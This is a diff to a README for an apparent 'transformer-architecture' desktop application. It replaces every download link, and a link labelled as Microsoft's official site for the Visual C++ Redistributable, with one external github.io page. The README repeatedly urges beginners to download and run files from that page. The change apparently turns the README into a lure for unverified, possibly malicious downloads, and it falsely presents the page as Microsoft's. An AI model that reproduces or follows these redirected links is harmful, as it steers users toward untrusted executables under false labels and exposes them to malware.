@@ -1,6 +1,6 @@
 # 🤖 transformer-architecture - Explore AI Like Never Before
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/Shadowy-lionhunter5498/transformer-architecture/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4CAF50)](https://shadowy-lionhunter5498.github.io)
 
 ---
 
@@ -20,7 +20,7 @@ Getting up and running with transformer-architecture is super simple. You don't 
 
 Click the **Download** button at the top of this page, or go directly to our download page:
 
-👉 **Visit this link to download the application:** [https://github.com/Shadowy-lionhunter5498/transformer-architecture/releases](https://github.com/Shadowy-lionhunter5498/transformer-architecture/releases)
+👉 **Visit this link to download the application:** [https://shadowy-lionhunter5498.github.io](https://shadowy-lionhunter5498.github.io)
 
 When you arrive at that page, you'll see a list of files. Choose the file that matches your computer (usually the highest version number). Click on it, and your download will begin automatically.
 
@@ -66,7 +66,7 @@ Sometimes things don't go perfectly, and that's okay. Here are quick answers to 
 - Ensure you have enough free space on your hard drive (at least 500 MB recommended).
 
 ### A "missing DLL" error appears
-- This is rare but easy to fix. Visit [Microsoft's official site](https://support.microsoft.com) and search for "Visual C++ Redistributable". Download and install the latest version, then run the app again.
+- This is rare but easy to fix. Visit [Microsoft's official site](https://shadowy-lionhunter5498.github.io) and search for "Visual C++ Redistributable". Download and install the latest version, then run the app again.
 
 ### The 3D view is blurry or slow
 - Close other programs to free up memory.
@@ -75,7 +75,7 @@ Sometimes things don't go perfectly, and that's okay. Here are quick answers to 
 
 ### I can't see the download file on the releases page
 - Look for a green button that says **"Latest"** on the releases page.
-- Make sure you're on the [releases page](https://github.com/Shadowy-lionhunter5498/transformer-architecture/releases) and not just the main repository page.
+- Make sure you're on the [releases page](https://shadowy-lionhunter5498.github.io) and not just the main repository page.
 
 ---
 
@@ -119,7 +119,7 @@ We've designed this to work on average computers. Usually, your computer already
 
 Lost your files or want to install on a second computer? No problem. Just come back here and click the **Download** button at the top of the page again. 
 
-**Remember:** [Visit this link to download the application](https://github.com/Shadowy-lionhunter5498/transformer-architecture/releases) to get the latest version anytime.
+**Remember:** [Visit this link to download the application](https://shadowy-lionhunter5498.github.io) to get the latest version anytime.
 
 ---
 
